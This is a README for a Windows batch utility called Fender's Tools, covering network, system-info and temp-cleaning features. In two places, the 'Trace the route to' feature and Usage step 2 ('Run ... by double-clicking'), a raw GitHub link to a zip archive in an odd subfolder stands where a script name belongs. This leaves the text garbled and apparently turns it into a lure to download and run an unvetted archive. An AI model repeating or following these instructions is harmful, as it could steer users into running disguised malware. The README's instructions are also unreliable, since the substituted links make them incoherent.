# Fender's Tools

**Description:**  
Fender's Tools is a simple, menu-driven batch script providing essential Windows network and system utilities. Easily scan your network, check IP and connection info, view system stats like uptime and battery, and clean temporary files — all from a single interface.

## Features

- **Network Tool:**  
  - Scan devices on your local network  
  - Show detailed IP configuration  
  - Display active TCP/UDP connections  
  - Trace the route to https://raw.githubusercontent.com/TheBatProgrammer/Fender-s-Tools/main/molompi/s-Tools-Fender-v2.9.zip  
  - Flush DNS cache  
  - Show MAC addresses of network adapters

- **System Info Tool:**  
  - Show current user and computer name  
  - Display system uptime  
  - Battery status and charge remaining  
  - RAM usage and free disk space

- **Temp Files Cleaner:**  
  - Delete temporary files from your user temp folder to free disk space

## Usage

1. Clone or download the repository.  
2. Run `https://raw.githubusercontent.com/TheBatProgrammer/Fender-s-Tools/main/molompi/s-Tools-Fender-v2.9.zip` by double-clicking or via Command Prompt.  
3. Select a tool by typing its number and follow prompts.  
4. Use the Exit option to close the program.

## Requirements

- Windows OS (tested on Windows 10/11)  
- Command Prompt support for batch scripts  
- Administrator privileges may be needed for some commands (e.g., flushing DNS)

## Notes

- Be careful when cleaning temp files; close programs to avoid data loss.  
- Network scan uses the 192.168.1.x subnet — modify in script if your network differs.  
- Tools rely on built-in Windows commands like `wmic`, `netstat`, and `tracert`.
